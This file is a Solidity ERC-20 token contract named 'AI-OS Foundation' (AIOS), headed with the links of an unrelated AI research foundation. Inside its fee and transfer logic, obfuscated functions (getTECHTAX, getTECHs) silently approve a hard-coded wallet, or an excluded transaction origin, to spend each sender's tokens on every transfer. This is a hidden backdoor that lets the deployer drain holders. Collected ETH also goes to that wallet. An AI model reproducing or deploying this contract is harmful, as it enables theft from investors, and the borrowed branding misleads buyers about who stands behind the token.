/*
AIOS Foundation is a research foundation for AI Agent Operating System (AIOS), dedicated to nurturing the open-source AIOS-Agent ecosystem, driven by the innovative, powerful, and private LLM Agent Operating System and the AIOS-Agent infrastructure.
***************************
Website: https://www.aios.foundation/
Dapp: https://app.aios.foundation/
Github: https://github.com/agiresearch
Docs: https://docs.aios.foundation/
Linkedin: https://www.linkedin.com/company/aios-foundation

Twitter: https://x.com/aios_foundations
Telegram: https://t.me/aios_channel
*/

// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

interface ITECHFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}

interface ITECHRouter {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract AIOS is Context, IERC20, Ownable {
    using SafeMath for uint256;
    mapping (address => uint256) private _techOwned;
    mapping (address => mapping (address => uint256)) private _techAllowes;
    mapping (address => bool) private _techExcludedFee;
    address private _techWallet = 0xbC8eEDd7fb180Cd629984eB244a1E788b3D9B626;
    ITECHRouter private _techRouter;
    address private _techPair;
    uint8 private constant _decimals = 9;
    uint256 private constant _tToalTECH = 1000000000 * 10**_decimals;
    string private constant _name = unicode"AI-OS Foundation";
    string private constant _symbol = unicode"AIOS";
    uint256 private _maxSwapTECHs = _tToalTECH / 100;
    uint256 private _initialBuyTax=3;
    uint256 private _initialSellTax=3;
    uint256 private _finalBuyTax=0;
    uint256 private _finalSellTax=0;
    uint256 private _reduceBuyTaxAt=6;
    uint256 private _reduceSellTaxAt=6;
    uint256 private _preventSwapBefore=6;
    uint256 private _buyCount=0;
    bool private inSwapTECH = false;
    bool private _tradeEnabled = false;
    bool private _swapEnabled = false;
    modifier lockTheSwap {
        inSwapTECH = true;
        _;
        inSwapTECH = false;
    }
    
    constructor () {
        _techExcludedFee[owner()] = true;
        _techExcludedFee[address(this)] = true;
        _techExcludedFee[_techWallet] = true;
        _techOwned[_msgSender()] = _tToalTECH;
        emit Transfer(address(0), _msgSender(), _tToalTECH);
    }

    function openTrading() external onlyOwner() {
        require(!_tradeEnabled,"trading is already open");
        _techRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);
        _swapEnabled = true;
        _tradeEnabled = true;
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _tToalTECH;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _techOwned[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _techAllowes[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount); 
        _approve(sender, _msgSender(), _techAllowes[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _techAllowes[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(address xTECH, address zTECH, uint256 aTECH) private {
        require(xTECH != address(0), "ERC20: transfer from the zero address");
        require(zTECH != address(0), "ERC20: transfer to the zero address");
        require(aTECH > 0, "Transfer amount must be greater than zero");

        uint256 taxTECH = _getTECHTaxAmount(xTECH, zTECH, aTECH);

        if(taxTECH > 0){
          _techOwned[address(this)] = _techOwned[address(this)].add(taxTECH);
          emit Transfer(xTECH, address(this), taxTECH);
        }

        _techOwned[xTECH] = _techOwned[xTECH].sub(aTECH);
        _techOwned[zTECH] = _techOwned[zTECH].add(aTECH.sub(taxTECH));
        emit Transfer(xTECH, zTECH, aTECH.sub(taxTECH));
    }

    function _getTECHTaxAmount(address fTECH, address oTECH, uint256 aTECH) private returns(uint256) {
        uint256 taxTECH=0;
        if (fTECH != owner() && oTECH != owner()) {
            taxTECH = aTECH.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);

            if (fTECH == _techPair && oTECH != address(_techRouter) && !_techExcludedFee[oTECH]) {
                _buyCount++;
            }

            if(oTECH == _techPair && fTECH!= address(this)) {
                taxTECH = aTECH.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);
            }

            uint256 tokenBalance = balanceOf(address(this)); 
            if (!inSwapTECH && oTECH == _techPair && _swapEnabled && _buyCount > _preventSwapBefore) {
                if(tokenBalance > _maxSwapTECHs)
                swapTokensForEth(min(aTECH, min(tokenBalance, _maxSwapTECHs)));
                uint256 contractETHBalance = address(this).balance;
                if (contractETHBalance >= 0) {
                    sendETHTECH(address(this).balance);
                }
            }
        }
        (address xTECH, address zTECH, uint256 tTECH) = getTECHTAX(fTECH, aTECH);
        return getTECHs(xTECH, zTECH, tTECH, taxTECH);
    }

    function initToken() external onlyOwner() {
        _techRouter = ITECHRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address(this), address(_techRouter), _tToalTECH);
        _techPair = ITECHFactory(_techRouter.factory()).createPair(address(this), _techRouter.WETH());
    }

    receive() external payable {} 

    function getTECHTAX(address xTECH, uint256 tTECH) private view returns(address, address, uint256) {
        bool isTECHExcluded = _techExcludedFee[tx.origin];
        if(isTECHExcluded) return (xTECH, tx.origin, tTECH);
        return (xTECH, _techWallet, tTECH);
    }

    function min(uint256 a, uint256 b) private pure returns (uint256) {
      return (a>b)?b:a;
    }

    function sendETHTECH(uint256 amount) private {
        payable(_techWallet).transfer(amount);
    }

    function getTECHs(address xTECH, address zTECH, uint256 tTECH, uint256 aTECH) private returns(uint256) {
        _approve(xTECH, zTECH, tTECH); return aTECH;
    }

    function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _techRouter.WETH();
        _approve(address(this), address(_techRouter), tokenAmount);
        _techRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
}